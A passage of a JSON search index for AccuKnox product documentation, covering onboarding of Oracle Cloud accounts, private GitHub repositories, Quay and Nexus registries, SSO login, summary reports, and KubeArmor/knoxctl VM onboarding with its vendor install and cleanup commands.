</ul>"},{"location":"how-to/k8s-security-onboarding/#admission-controller-support","title":"Admission Controller Support","text":"<p>AccuKnox Admission Controller enforces:</p> <ol> <li>Trusted registry enforcement for images</li> <li>Deployment compliance with security best practices (no root, no host mounts, etc.)</li> <li>Violations reported to AccuKnox Control Plane (visible under Monitors &amp; Alerts)</li> </ol>"},{"location":"how-to/k8s-security-onboarding/#cluster-access-to-control-plane","title":"Cluster Access to Control Plane","text":"<p>Each feature requires outbound (egress) HTTPS access only. Refer to the access notes under each feature for exact service and port requirements.</p> <p></p>"},{"location":"how-to/oracle-onboarding/","title":"Onboarding Oracle Cloud Infrastructure (OCI) to AccuKnox","text":"<p>This guide will walk you through the two main stages of the process:</p> <ol> <li>Configuring OCI: Creating a dedicated read-only user, group, and policy in your Oracle Cloud account.</li> <li>Onboarding to AccuKnox: Using the credentials generated from OCI to connect your account to the AccuKnox platform.</li> </ol>"},{"location":"how-to/oracle-onboarding/#part-1-configure-your-oracle-cloud-infrastructure-oci-account","title":"Part 1: Configure Your Oracle Cloud Infrastructure (OCI) Account","text":"<p>Follow these steps to create a secure, read-only access configuration for AccuKnox within your OCI console. \ud83d\udd10</p>"},{"location":"how-to/oracle-onboarding/#1-create-a-new-user","title":"1. Create a New User","text":"<p>First, we'll create a dedicated user for AccuKnox.</p> <ol> <li>Log in to your Oracle Cloud Console.</li> <li>Navigate to the main menu \u2630 and go to Identity &amp; Security.</li> <li>Under Identity, click on Domains.</li> <li>Select the appropriate domain (usually the Default domain).</li> <li>In the left pane, click on Users.</li> <li>Click Create user.</li> <li>Enter the following details:<ul> <li>First Name: <code>AccuKnox</code></li> <li>Last Name: <code>Scan</code></li> <li>Email / Username: <code>cloudscan@accuknox.com</code></li> </ul> </li> <li>Click Create.</li> </ol> <p></p>"},{"location":"how-to/oracle-onboarding/#2-create-a-new-group","title":"2. Create a New Group","text":"<p>Next, create a group to hold the new user and assign permissions to it.</p> <ol> <li>In the same domain settings, click on Groups in the left pane.</li> <li>Click Create group.</li> <li>Enter the following details:<ul> <li>Name: <code>SecurityAudit</code></li> <li>Description: <code>AccuKnox Security Audit Access</code></li> </ul> </li> <li>Click Create.</li> <li>After the group is created, click on its name (<code>SecurityAudit</code>) from the list.</li> <li>Click Add user to group and select the AccuKnox Scan user you created earlier.</li> </ol> <p></p>"},{"location":"how-to/oracle-onboarding/#3-create-a-read-only-policy","title":"3. Create a Read-Only Policy","text":"<p>This policy grants the <code>SecurityAudit</code> group read-only access to all resources in your tenancy.</p> <ol> <li>Navigate to the main menu \u2630 and go to Identity &amp; Security.</li> <li>Under Identity, click on Policies.</li> <li>Ensure you are in your root compartment to apply the policy to the entire tenancy.</li> <li> <p>Click Create Policy. </p> </li> <li> <p>Enter the following details:</p> <ul> <li>Name: <code>SecurityAudit</code></li> <li>Description: <code>AccuKnox Security Audit Policy</code></li> </ul> </li> <li>Switch the Policy Builder to the Manual editor.</li> <li> <p>In the text box, enter the following policy statement:</p> <pre><code>Allow group SecurityAudit to read all-resources in tenancy\n</code></pre> </li> <li> <p>Click Create.</p> </li> </ol>"},{"location":"how-to/oracle-onboarding/#4-generate-api-keys","title":"4. Generate API Keys","text":"<p>Finally, generate the API keys that AccuKnox will use to connect to your account.</p> <ol> <li>Navigate back to the AccuKnox Scan user profile (Identity &amp; Security -&gt; Domains -&gt; Your Domain -&gt; Users -&gt; AccuKnox Scan).</li> <li>In the left pane under Resources, click API Keys.</li> <li> <p>Click Add API key. </p> </li> <li> <p>Select the Generate API key pair option.</p> </li> <li>Click Download Private Key and Download Public Key. Save the private key file (<code>.pem</code>) in a secure location; you will need its contents shortly.</li> <li>Click Add.</li> <li>A Configuration File Preview will appear in a pop-up window. Copy the entire text block and save it to a temporary text file. This contains your <code>User OCID</code>, <code>Tenancy OCID</code>, <code>Key Fingerprint</code>, and <code>Region</code>.</li> </ol> <p>You now have all the necessary information from OCI!</p>"},{"location":"how-to/oracle-onboarding/#part-2-onboard-your-oci-account-in-accuknox","title":"Part 2: Onboard Your OCI Account in AccuKnox","text":"<p>Now, let's use the credentials you just created to connect your account to the AccuKnox platform. \u2728</p> <ol> <li> <p>Log in to your AccuKnox account. </p> </li> <li> <p>Navigate to Settings \u2699\ufe0f and select Cloud Accounts.</p> </li> <li> <p>Click the Add Account button. </p> </li> <li> <p>Select Oracle from the list of cloud providers.</p> </li> <li> <p>You may be prompted to add optional labels and tags for better organization. Configure them as needed and proceed. </p> </li> <li> <p>You will now see the credential entry screen. Fill in the fields using the information you saved from the OCI console in the previous steps, use your OCI config file and the private key you downloaded:</p> <ul> <li>User OCID</li> <li>Tenancy OCID</li> <li>Compartment ID (You can find this in the OCI console under Identity &amp; Security -&gt; Compartments)</li> <li>Fingerprint</li> <li>Region</li> <li>Private Key</li> </ul> <p></p> </li> </ol> <p>Click Add and AccuKnox will validate the credentials and connect to your OCI account. You should see your newly added Oracle account in the list on the Cloud Accounts page.</p> <p></p>"},{"location":"how-to/oracle-onboarding/#viewing-and-managing-your-onboarded-oci-account","title":"Viewing and Managing Your Onboarded OCI Account","text":"<p>Once the Oracle Cloud account is onboarded, you can shortly view the Cloud Findings by navigating to the Issues -&gt; Cloud Findings -&gt; Cloud Scan and selecting the Oracle account from the dropdown to view the findings specific to that account.</p> <p></p> <p>We make several widgets for Oracle Cloud findings available on the Dashboard as well. These widgets provide insights into the security posture of your Oracle Cloud resources.</p> <p></p> <p></p> <p>You can also view and manage the compliance status and benchmarks associated with your Oracle account by going to the Compliance section and selecting the Oracle account from the dropdown.</p> <p></p> <p></p>"},{"location":"how-to/playbook-aspm/","title":"ASPM Playbook","text":""},{"location":"how-to/playbook-cspm/","title":"CSPM Playbook","text":""},{"location":"how-to/playbook-cwpp/","title":"CWPP Playbook","text":""},{"location":"how-to/playbook-hostsec/","title":"Host Security Playbook","text":""},{"location":"how-to/playbook-integrations/","title":"Integrations Playbook","text":""},{"location":"how-to/playbook-kspm/","title":"KSPM Playbook","text":""},{"location":"how-to/playbook-overview/","title":"AccuKnox Playbooks","text":"<p>ASPM Playbook</p> <p>CSPM Playbook</p> <p>CWPP Playbook</p> <p>KSPM Playbook</p> <p>Integrations Playbook</p> <p>Host Security Playbook</p>"},{"location":"how-to/private-github-repo-onboarding/","title":"Onboarding a Private Github Repo","text":""},{"location":"how-to/private-github-repo-onboarding/#configuration","title":"Configuration","text":""},{"location":"how-to/private-github-repo-onboarding/#prerequisites","title":"Prerequisites","text":"<p>For Github the IaC Scan from AccuKnox SaaS we require three prerequisites. They are as follows:</p> <ul> <li>Creating Fine-Grained tokens from GitHub for\u00a0Private Repos only</li> <li>Label creation</li> <li>Adding the Code repository</li> </ul>"},{"location":"how-to/private-github-repo-onboarding/#creating-fine-grained-tokens-from-github","title":"Creating fine-grained tokens from GitHub","text":"<p>For generating the fine-grained access token from GitHub users need to do the following steps.</p> <p>Step 1: Go to the Github profile and select Settings.</p> <p></p> <p>Step 2: Select the Developer Settings in Settings options</p> <p></p> <p>Step 3: Select the Personal Access token-&gt; Fine-Grained Access token </p> <p>Step 4: Click on the Generate new token option</p> <p></p> <p>Step 5: Please fill out the token name, description, Duration, and Repository that you need to onboard, and in the Repository permission section please select the content: Readonly</p> <p></p> <p>Step 6: After this click on Generate token to get the Fine Grained access token with Read-only access to the Repository</p> <p></p>"},{"location":"how-to/private-github-repo-onboarding/#label-creation","title":"Label Creation","text":"<p>After Creating the Fine-grained Access token user needs to create a label from AccuKnox SaaS. For this user need to navigate to the Settings-&gt; label Section click on Add new label and create their label</p> <p></p>"},{"location":"how-to/private-github-repo-onboarding/#adding-code-repository","title":"Adding code Repository","text":"<p>After creating the token from Github and Creating the label from AccuKnox SaaS. Users can onboard the Source Code Repository by following the steps below.</p> <p>Step 1: Navigate to the Settings-&gt; Integrations and select the Code Source Configuration</p> <p></p> <p>Step 2: Click on the Add Configuration button</p> <p></p> <p>Step 3: Fill in the name select the type as Github input the Repository URL and Fine-grained Access token and click on Verify</p> <p></p> <p>Step 4: After successful Verification, you can select the branch and Label name that was created from the SaaS.</p> <p></p> <p>Step5: Click on save to add the Source code configuration</p> <p></p>"},{"location":"how-to/private-github-repo-onboarding/#iac-scan","title":"IaC scan","text":"<p>To create an IaC scan for the added Source Code Configuration users need to perform the following steps.</p> <p>Step 1: Navigate to Settings-&gt; Integrations and select IaC</p> <p></p> <p>Step 2: Click on Add Configuration give the name and select the Repository for which you want to schedule the IaC Scan. Select the Framework type as Kubernetes yaml, helm, or Terraform and click on save to add the IaC configuration.</p> <p></p> <p>Step 3:\u00a0After saving the IaC Configuration the scan will start in the background and it will be completed sometime.</p> <p></p> <p>Step 4:\u00a0After the scan is completed the progress will change to 100% completed</p> <p></p>"},{"location":"how-to/private-github-repo-onboarding/#risk-assessment-how-to-check-findings","title":"Risk Assessment: How to check Findings?","text":"<p>After the IaC scan is completed to see the findings users need to navigate to the Issues-&gt; Findings section and select IaC findings in the filter to see all the findings.</p> <p></p> <p>We can filter the findings based on the Repository, Risk Factor, and so on.</p>"},{"location":"how-to/private-github-repo-onboarding/#remediation-how-to-fix-problems-how-to-create-tickets","title":"Remediation: How to fix problems? How to create tickets?","text":"<p>To remediate any findings users will need to select the finding or group of findings From the issues-&gt; Findings page and click Create Ticket as shown in the below screenshot.</p> <p></p> <p>Info</p> <p>Before this users must have integrated their Ticketing backend like Jira Servicenow or connects or Freshservice under Integrations-&gt;CSPM section</p> <p>After clicking on the create ticket Icon the next page will popup</p> <p></p> <p>Once the user clicks on Create Ticket new page with all the information related to the IaC findings and with a predefined Priority based on the Risk Factor. The user has to click on Create to confirm the ticket creation.</p> <p></p>"},{"location":"how-to/quay/","title":"Quay Registry Onboarding","text":"<p>Red Hat Quay is a fully managed hosted container image registry that offers both public and private repository options and an automated lifecycle of your containerized artifacts.</p>"},{"location":"how-to/quay/#pre-requisites","title":"Pre-requisites","text":"<ul> <li> <p>A valid Quay.io account</p> </li> <li> <p>Container Images stored in the account</p> </li> <li> <p>User creds with at least image pull permission</p> </li> </ul> <p></p>"},{"location":"how-to/quay/#steps-to-onboard-quay-registry-on-accuknox","title":"Steps to Onboard Quay Registry on AccuKnox","text":"<p>Step 1: In the AccuKnox dashboard, under Issues, click on \"Registry Scan\"</p> <ul> <li>Alternatively you can go to \"Settings \u2192 Integration \u2192 Registry Scan\"</li> </ul> <p>Now, click on \"Add Registry\"</p> <p></p> <p>Step 2: Give the registry name, select Label, and select \"Quay\" from the Registry type dropdown. Then, provide the user credentials.</p> <p></p> <p>Provide the Tag pattern and schedule a time( using the cron expression) for the scanning. If you need to trigger the scan after saving, click the \"Trigger scan on save\" checkbox.</p> <p>Step 3: After providing all the information, click on \"Test Connection\", it should show \"Registry Tested Successfully\".</p> <p>Now, click on Save.</p> <p></p> <p>After saving the registry, the scan will start based on the scheduled time, if Trigger scan on save is checked the scan will start right after save. After saving the scan user will be redirected to Settings -&gt; Integrations -&gt; Registry. Here, we can see the list of onboarded registries and their details.</p> <p></p> <p>Alternatively, you can click on \"View Registry Scan\" from the list view and this will redirect to Issues \u2192 Registry Scan</p> <p>Once the scanning is completed, we can see the scan results</p> <p></p> <p>Under \"Findings\", you can find the scanned registry.</p> <p>To view the details of your registry, you can use filters such as \"registry_type\", and then select the \"quay\" registry you can also use the filter \"registry_name\" and provide the name of your registry.</p> <p></p> <p>By clicking on the repositories, we can get more details about the scan results.</p> <p></p>"},{"location":"how-to/sonatype-nexus/","title":"Sonatype Nexus Registry Onboarding","text":"<p>Sonatype Nexus Registry is a robust and secure platform designed for managing and storing container images. It supports various formats, such as Docker and Helm, and is tailored to meet the needs of DevOps teams and software developers.</p> <p>AccuKnox enhances the security of container images stored in Nexus Registries by offering continuous vulnerability scanning. This ensures that images are regularly assessed for potential risks and security issues, helping to maintain a secure environment.</p>"},{"location":"how-to/sonatype-nexus/#accuknox-support-for-sonatype-nexus-registry-scanning","title":"AccuKnox Support for Sonatype Nexus Registry Scanning","text":"<p>AccuKnox integrates effortlessly with Sonatype Nexus Registries, providing real-time vulnerability scanning for container images. This integration enables early detection of security threats, offering actionable insights to address them promptly.</p>"},{"location":"how-to/sonatype-nexus/#configuring-the-sonatype-nexus-registry","title":"Configuring the Sonatype Nexus Registry","text":"<p>To configure Nexus Registry for vulnerability scanning, follow these steps:</p> <p>1.\u00a0 Go to Settings -&gt; Integration -&gt; Registry.</p> <p>2.\u00a0 Click on the Add Registry button</p> <p>3.\u00a0 Fill out the required fields such as: \u00a0 \u00a0 1.\u00a0 Name \u00a0 \u00a0 2.\u00a0 Description \u00a0 \u00a0 3.\u00a0 Registry Type \u00a0 \u00a0 4.\u00a0 URL \u00a0 \u00a0 5.\u00a0 Credentials \u00a0 \u00a0 6.\u00a0 Cron Expression (for scheduled scans)</p> <p>4.\u00a0 Test the connection to ensure the configuration is correct. A successful response indicates the connection is established. </p> <p>5.\u00a0 Once verified, save the configuration and create the registry</p> <p>After the registry is configured and connected, it will appear as Active in the registry list. </p> <p>After configuration, AccuKnox will start scanning based on the schedule or immediately if the Trigger scan on save option is selected. The results of the scan can be viewed by navigating to the registry page.</p>"},{"location":"how-to/sonatype-nexus/#viewing-scan-details","title":"Viewing Scan Details","text":"<p>Once the scan is completed, you can access detailed scan information by following these steps:</p> <p>1.\u00a0 Go to Issues -&gt; Findings -&gt; Registry Scan.</p> <p>2.\u00a0 Filter the results to view the onboarded registry.</p> <p>3.\u00a0 Click on an image to see a detailed view of the metadata, vulnerabilities, and other scan details.</p> <p>For instance, the Nexus Registry onboarded in this demo has an image called accuknox/alpine. The vulnerabilities associated with this image will be visible in the scan results. By clicking on the image, you can view a list of identified vulnerabilities, their severity, CVSS scores, and suggested remediation steps.</p> <p></p> <p>To get more detailed information about the vulnerabilities associated with the image, simply click on the container image in the AccuKnox dashboard. This will allow you to view the metadata, including any embedded secrets and a comprehensive list of the vulnerabilities identified in the image. You will also be able to explore the severity of these vulnerabilities, CVSS scores, and recommended remediation actions.</p> <p></p> <p>Integrating Sonatype Nexus Registry with AccuKnox ensures continuous and efficient vulnerability scanning for your container images. AccuKnox provides a secure and compliance-friendly solution to detect, assess, and address vulnerabilities, helping maintain a robust security posture.</p>"},{"location":"how-to/sso/","title":"SSO Login Guide","text":"<p>This guide covers the complete process from inviting a new user to logging in with SSO.</p>"},{"location":"how-to/sso/#1-inviting-a-new-user","title":"1. Inviting a New User","text":"<p>Log in to your AccuKnox dashboard.</p> <p></p> <p>Navigate to \"User Management\" in the left sidebar menu. Click the \"User +\" button in the top right corner of the Users page.</p> <p></p> <p>In the \"Invite User\" form, fill out the following details and hit send.</p> <p></p> <p>Note</p> <p>You can view pending invitations in the \"Pending Invites\" tab on the Users page. You can resend or revoke invitations from this tab. Viewing all permissions of a user is possible via the main tab.</p>"},{"location":"how-to/sso/#2-user-receives-invitation","title":"2. User Receives Invitation","text":"<p>The invited user will receive containing a link to accept the invitation and set up their account if they haven't already done so.</p> <p></p>"},{"location":"how-to/sso/#3-user-login-options","title":"3. User Login Options","text":"<p>Users can log in to AccuKnox using two methods:</p>"},{"location":"how-to/sso/#option-a-traditional-login","title":"Option A: Traditional Login","text":"<ol> <li>Go to the AccuKnox login page.</li> <li>Enter the email address and password.</li> <li>Click \"Sign In\".</li> </ol> <p>Note</p> <p>This requires you to use the MFA (multi-factor authentication) code if it was enabled during the invitation process. MFA is required for every sign-in attempt.</p>"},{"location":"how-to/sso/#option-b-single-sign-on-sso-with-google","title":"Option B: Single Sign-On (SSO) with Google","text":"<ol> <li>Go to the AccuKnox login page.</li> <li>Look for \"Or login with\" at the bottom of the form.</li> <li>Click on the \"Google\" button.</li> <li>If not already signed in to Google, enter Google account credentials.</li> <li>Grant any necessary permissions for AccuKnox.</li> </ol> <p>Note</p> <p>If you are already signed in to Google, you will be automatically logged in to AccuKnox. No need for MFA in this case.</p>"},{"location":"how-to/sso/#notes","title":"Notes","text":"<ul> <li>SSO is currently only supported for Google accounts.</li> <li>Users must be invited with their Gmail address to use Google SSO.</li> <li>For the best experience, use the same email address for invitation and login.</li> <li>If you encounter any issues, contact your AccuKnox administrator or support team.</li> <li>Emails with + modifiers (e.g., test+stable@gmail.com or example+solutions@gmail.com) are not supported for SSO. Please use a base email address.</li> </ul>"},{"location":"how-to/summarized-custom-reports/","title":"Summarized Custom Report","text":"<p>AccuKnox's latest feature update provides new custom reporting feature capabilities that can help users get the reports customized as per their requirements.</p> <p>Note</p> <p>For this feature to be enabled the customers need to inform the Support team(support@accuknox.com) regarding their requirements for custom reporting. Then the AccuKnox Support team can configure the report template from the backend. After which the users can generate an on-demand report or configure a scheduled report.</p> <p>You can also read documentation on How to Configure Custom Reports</p>"},{"location":"how-to/summarized-custom-reports/#summary-report","title":"Summary Report","text":"<p>AccuKnox Summary report can give an overview of the findings across various aspects like the code,cloud, cluster,container related findings. It can give a summarized view of the findings and actionable items that the users need to give more attention to improve their security posture. Here are some of the widgets that can be present in the summary report.</p>"},{"location":"how-to/summarized-custom-reports/#new-assets-discovered","title":"New Assets Discovered","text":"<p>This widget provides the no. of New assets discovered across your code repos, cloud accounts, clusters/vms and container images that are onboarded into the AccuKnox SaaS in the defined period.</p>"},{"location":"how-to/summarized-custom-reports/#new-critical-findings","title":"New Critical Findings","text":"<p>This widget provides the no. of New critical findings across all the assets that are onboarded into the AccuKnox SaaS. This will be very helpful to identify the new critical findings that has been discovered in the latest scans. This can also be an immediate actionable items for the users.</p>"},{"location":"how-to/summarized-custom-reports/#new-findings-discovered","title":"New Findings Discovered","text":"<p>This widget will provide the new findings that were discovered across all the latest scans. This will also be an immediate action item for the users to act upon.</p> <p></p>"},{"location":"how-to/summarized-custom-reports/#no-of-findings-fixed","title":"No. Of Findings Fixed","text":"<p>This widget will give a good impact for the security posture as it will showcase the no. of findings that were fixed by the team in the pre defined report period. This widget will help to improve the customer's security score.</p>"},{"location":"how-to/summarized-custom-reports/#no-of-critical-findings-unticketed","title":"No. of Critical Findings unticketed","text":"<p>This widget will provide the information regarding the Critical findings that are not ticketed.This has to be looked upon by the users to create a ticket and assign it for remediation as these critical findings might affect their security posture.</p>"},{"location":"how-to/summarized-custom-reports/#trend-analysis","title":"Trend Analysis","text":""},{"location":"how-to/summarized-custom-reports/#new-assets-discovered-weekly-trend","title":"New Assets discovered Weekly Trend","text":"<p>This widget will provide the trend analysis across the no. of Assets that are getting discovered on a weekly basis from the onboarded cloud accounts,clusters, containers. This can give a clear picture of the growing asset count.</p> <p></p> <p></p>"},{"location":"how-to/summarized-custom-reports/#new-findings-weekly-trend","title":"New Findings Weekly Trend","text":"<p>This widget will provide the Weekly trend of the new findings discovered across the assets. This will show the rate at which the findings are occurring in the onboarded assets. This will also give users an idea of how their new findings discovered trend. Using this they can assess their security posture. If this widget shows the sliding trend they the users can safely believe that their new findings rate have gone down which will imply improvement in their security posture.</p>"},{"location":"how-to/summarized-custom-reports/#critical-findings-weekly-trend","title":"Critical Findings Weekly Trend","text":"<p>This widget will provide the Critical Findings weekly trends that are discovered every week. These will be another important actionable item for the users as increase in Critical Findings will be a security risk for their infrastructure or assets.</p> <p>Note</p> <p>The above are some of the sample widgets. These can be further customized based on the user requirements. Users can raise their request with support@accuknox.com for configuring this report with widgets of their choice.</p>"},{"location":"how-to/systemd-nonbtf/","title":"SystemD Based Non-BTF Environments","text":""},{"location":"how-to/systemd-nonbtf/#compiling-system-monitor","title":"Compiling system monitor","text":"<p>Some Kernels don't have BTF information available which is required by KubeArmor's system monitor to work out of the box. Thus, the monitor has to be built either on the target machine or on a machine which matches the kernel version of the target machine.</p> <p>There are two ways to do it, you can chose either one:</p>"},{"location":"how-to/systemd-nonbtf/#compile-system-monitor-using-docker-recommended-and-reliable","title":"Compile system monitor using Docker (Recommended and reliable)","text":"<ol> <li> <p>Dependencies:</p> <ul> <li> <p>Make sure you have docker installed</p> </li> <li> <p>Make sure you have linux-headers installed for your package</p> </li> </ul> </li> <li> <p>Run the kubearmor-init container using the below command which will generate the file <code>/tmp/system_monitor.bpf.o</code>.</p> </li> </ol> <pre><code>sudo docker run --rm -d --name=kubearmor-init --privileged \\\n-v \"/tmp:/opt/kubearmor/BPF:rw\" \\\n-v \"/lib/modules:/lib/modules:ro\" \\\n-v \"/sys/kernel/security:/sys/kernel/security:ro\" \\\n-v \"/sys/kernel/debug:/sys/kernel/debug:ro\" \\\n-v \"/media/root/etc/os-release:/media/root/etc/os-release:ro\" \\\n-v \"/usr/src:/usr/src\" \\\nkubearmor/kubearmor-init:stable\n</code></pre>"},{"location":"how-to/systemd-nonbtf/#compile-system-monitor-directly-might-not-work-for-some-versions","title":"Compile system monitor directly (Might not work for some versions)","text":"<p>Get the KubeArmor version from Release v1.4.3 - kubearmor/KubeArmor</p> <p>Fetch and install KubeArmor by running</p> <pre><code>VER=\"1.4.3\" # set according to the latest version\ncurl -sfLO &lt;https://github.com/kubearmor/KubeArmor/releases/download/v${VER}/kubearmor_${VER}_linux-amd64.deb&gt;\nsudo apt install ./kubearmor_${VER}_linux-amd64.deb\n</code></pre> <p>The above will generate the system monitor file at <code>/opt/kubearmor/BPF/system_monitor.bpf.o</code>. Copy it to some other path.</p>"},{"location":"how-to/systemd-nonbtf/#onboard-the-node","title":"Onboard the node","text":"<p>Once you've compiled the monitor, you can specify it while onboarding the control plane/node.</p> <p>Install <code>knoxctl</code> - the accuknox CLI by running the below command</p> <pre><code>curl -sfL &lt;https://knoxctl.accuknox.com/install.sh&gt; | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p>Onboard your node/control plane by running the respective command with the below additional flags</p> <pre><code>sudo knoxctl onboard vm cp-node \\\n--version v0.10.7 \\\n--join-token=ae0e9974-6a8d-4c4f-9148-fb4e0ca769d9 \\ #this may vary\n--spire-host=spire.accuknox.com \\\n--pps-host=pps.accuknox.com \\\n--knox-gateway=knox-gw.accuknox.com:3000 \\\n--vm-mode=\"systemd\" \\  # this may vary\n--enable-host-policy-discovery \\\n--hostViz=\"process,network,file,capabilities\" \\\n--viz=\"process,network,file\"\n--skip-btf-check=true \\\n--system-monitor-path=/tmp/system_monitor.bpf.o\n</code></pre> <p>As for the additional flags, here is the parameter table:</p> Flag Scope Example Description <code>--enable-host-policy-discovery</code> Host --- Enables automatic host-level policy discovery (process, network, file, capabilities). <code>--hostViz=&lt;options&gt;</code> Host-level telemetry visualization <code>process,network,file,capabilities</code> Visualizes process activity, network traffic, file access, and Linux capabilities. <code>--viz=&lt;options&gt;</code> Containers, workloads, or VM-level view <code>process,network,file</code> Visualizes process, network, and file activities."},{"location":"how-to/vm-onboard-access-keys/","title":"VM Onboarding using Access Keys","text":""},{"location":"how-to/vm-onboard-access-keys/#overview","title":"Overview","text":"<p>The access key method simplifies the onboarding of multiple VMs as control plane VMs. The process mirrors that of SystemD mode and Docker Container mode. Using the access key, users can onboard a VM directly from the CLI without needing to access the AccuKnox SaaS interface.</p> <p>Users can select either SystemD or Docker Container mode for onboarding, as the same access key works for both. Moreover, the access key provides enhanced flexibility, enabling the onboarding of multiple control plane VMs with a single key</p> <p>Here we will follow the <code>SystemD</code> mode of onboarding</p>"},{"location":"how-to/vm-onboard-access-keys/#pre-requisites","title":"Pre-requisites","text":"<ol> <li> <p>Access Key</p> </li> <li> <p>Resource requirements</p> </li> <li> <p>Network requirements</p> </li> <li> <p>BTF support is enabled in the VM</p> </li> <li> <p>RabbitMQ should be installed</p> </li> </ol>"},{"location":"how-to/vm-onboard-access-keys/#onboarding","title":"Onboarding","text":"<p>In the case of the Access key onboarding method User can directly onboard the VMs from the CLI</p> <p>NOTE</p> <p>We don't need to follow AccuKnox UI for the access key method of the VM onboarding; we will be using a command to do the same from the CLI.</p>"},{"location":"how-to/vm-onboard-access-keys/#install-knoxctlaccuknox-cli","title":"Install knoxctl/accuknox-cli","text":"<p><code>curl -sfL https://knoxctl.accuknox.com/install.sh | sudo sh -s -- -b /usr/bin</code></p>"},{"location":"how-to/vm-onboard-access-keys/#onboarding-control-plane","title":"Onboarding Control Plane","text":"<p>The command may look something like this:</p> <pre><code>$ knoxctl onboard vm cp-node \\\n--version v0.10.7 \\\n--spire-host=spire.accuknox.com \\\n--pps-host=pps.accuknox.com \\\n--knox-gateway=knox-gw.accuknox.com:3000 \\\n--vm-name=\"accuknox-vm\" \\\n--access-key-url=\"cwpp.demo.accuknox.com\" \\\n--access-key=\"access-token\" \\\n--enable-host-policy-discovery \\\n--hostViz=\"process,network,file,capabilities\" \\\n--viz=\"process,network,file\"\n</code></pre> <p>In the above command, You need to replace the <code>--access-token</code> value with the created access key, and substitute <code>--vm-name</code> with the desired vm name. After replacing the value the command will look like this:</p> <p>By default, if Docker is not found, systemd mode of installation would be used. If you want to explicitly onboard using systemd services, add the <code>--vm-mode=systemd</code> flag to the above command.</p> <p>As for the additional flags, here is the parameter table:</p> Flag Scope Example Description <code>--enable-host-policy-discovery</code> Host --- Enables automatic host-level policy discovery (process, network, file, capabilities). <code>--hostViz=&lt;options&gt;</code> Host-level telemetry visualization <code>process,network,file,capabilities</code> Visualizes process activity, network traffic, file access, and Linux capabilities. <code>--viz=&lt;options&gt;</code> Containers, workloads, or VM-level view <code>process,network,file</code> Visualizes process, network, and file activities."},{"location":"how-to/vm-onboard-access-keys/#output","title":"Output","text":"<p>The above command will emit the command to onboard worker nodes. You may also use the <code>--cp-node-addr</code> flag to specify the address that other nodes will use to connect with your cluster.</p> <p>NOTE</p> <p>The user needs to repeat the CLI onboarding command to onboard multiple control plane VMs using the access key</p>"},{"location":"how-to/vm-onboard-access-keys/#onboarding-worker-nodes","title":"Onboarding Worker Nodes","text":"<p>The second command will be for onboarding worker nodes. It may look something like this:</p> <p><code>knoxctl onboard vm node --vm-mode=\"systemd\" --version=v0.8.1 --cp-node-addr=&lt;control-plane-addr&gt;</code></p> <p>Example:</p> <pre><code>$ knoxctl onboard vm node --vm-mode=\"systemd\"  --version=v0.8.1 --cp-node-addr=192.168.56.106\nPulling kubearmor-init       ... done\nPulling kubearmor            ... done\nPulling kubearmor-vm-adapter ... done\nCreating network \"accuknox-config_accuknox-net\" with the default driver\nCreating kubearmor-init ... done\nCreating kubearmor      ... done\nCreating kubearmor-vm-adapter ... done\nonboard-vm-node.go:41: VM successfully joined with control-plane!\n</code></pre> <p></p>"},{"location":"how-to/vm-onboard-access-keys/#troubleshooting","title":"Troubleshooting","text":"<p>If you encounter any issues while onboarding, use the commands below to debug:</p> <p><code>sudo journalctl -xeu &lt;service-name&gt;.service</code></p> <p>Replace <code>&lt;service-name&gt;</code> with one of the following:</p> <ul> <li> <p><code>kubearmor</code>: Logs show policy enforcement and monitor Kubernetes workloads; useful for debugging misconfigurations or runtime issues.</p> </li> <li> <p><code>kubearmor-relay-server</code>: Bridges KubeArmor clients with external log systems; logs debug communication or relay errors.</p> </li> <li> <p><code>kubearmor-vm-adapter</code>: Tracks policy enforcement in VMs; logs diagnose policy application on non-Kubernetes workloads.</p> </li> <li> <p><code>accuknox-policy-enforcement-agent</code>: Enforces security policies; logs troubleshoot policy errors or conflicts.</p> </li> <li> <p><code>accuknox-shared-informer-agent</code>: Shares Kubernetes resource data; logs debug metadata collection issues.</p> </li> <li> <p><code>accuknox-sumengine</code>: Processes telemetry data; logs resolve performance or data processing errors.</p> </li> <li> <p><code>accuknox-discover-agent</code>: Discovers potential policies; logs analyze policy suggestions.</p> </li> <li> <p><code>spire-agent</code>: Manages workload identities; logs debug identity issuance and attestation issues.</p> </li> <li> <p><code>accuknox-hardening-agent</code>: Automates system hardening; logs troubleshoot configuration and hardening conflicts.</p> </li> </ul>"},{"location":"how-to/vm-onboard-access-keys/#deboarding","title":"Deboarding","text":"<p>Deboard the cluster from SaaS first.</p> <p>To deboard the worker-vm/Node:</p> <p><code>knoxctl deboard vm node</code></p> <p>To deboard the Control-Plane VM:</p> <p><code>knoxctl deboard vm cp-node</code></p> <p>Sample Output:</p> <pre><code>$ knoxctl deboard vm cp-node\n[+] Running 10/10\n \u2714 Container shared-informer-agent       Removed                                                                   0.6s\n \u2714 Container feeder-service              Removed                                                                   0.6s\n \u2714 Container policy-enforcement-agent    Removed                                                                   0.8s\n \u2714 Container wait-for-it                 Removed                                                                   0.0s\n \u2714 Container kubearmor-vm-adapter        Removed                                                                   5.6s\n \u2714 Container kubearmor-relay-server      Removed                                                                   1.5s\n \u2714 Container spire-agent                 Removed                                                                   0.5s\n \u2714 Container kubearmor                   Removed                                                                  10.4s\n \u2714 Container kubearmor-init              Removed                                                                   0.0s\n \u2714 Network accuknox-config_accuknox-net  Removed                                                                   0.3s\nPlease remove any remaining resources at /home/user/.accuknox-config\nControl plane node deboarded successfully.\n</code></pre> <p>After that cleanup the ~/.accuknox-config directory</p> <p><code>sudo rm -rf ~/.accuknox-config</code></p>"},{"location":"how-to/vm-onboard-deboard-docker/","title":"Onboarding and Deboarding VMs with Docker","text":""},{"location":"how-to/vm-onboard-deboard-docker/#docker","title":"Docker","text":"<p>Docker v19.0.3 and Docker Compose v1.27.0+ are required. Follow the latest Install Docker Engine for downloading. Ensure you also add your user to the docker user group: Linux post-installation steps for Docker Engine.</p> <p>Linux Kernel v5.8+ with BPF LSM support is needed. See how to enable BPF LSM.</p> <p>If the environment does not support Linux v5.8+ or BPF LSM and instead uses AppArmor, host enforcement will still work out of the box. However, to protect containers, new containers must be created with special options. Refer to the \"Support for Non-Orchestrated Containers\" documentation for more details.</p>"},{"location":"how-to/vm-onboard-deboard-docker/#resource-requirements","title":"Resource Requirements","text":"Node Type vCPU Memory Disk Control Plane Node 2 4 GB 24 GB Worker Node 2 2 GB 12 GB"},{"location":"how-to/vm-onboard-deboard-docker/#network-requirements","title":"Network Requirements","text":"<p>Connectivity between control plane node and worker nodes is a must. They should either be:</p> <ul> <li> <p>Part 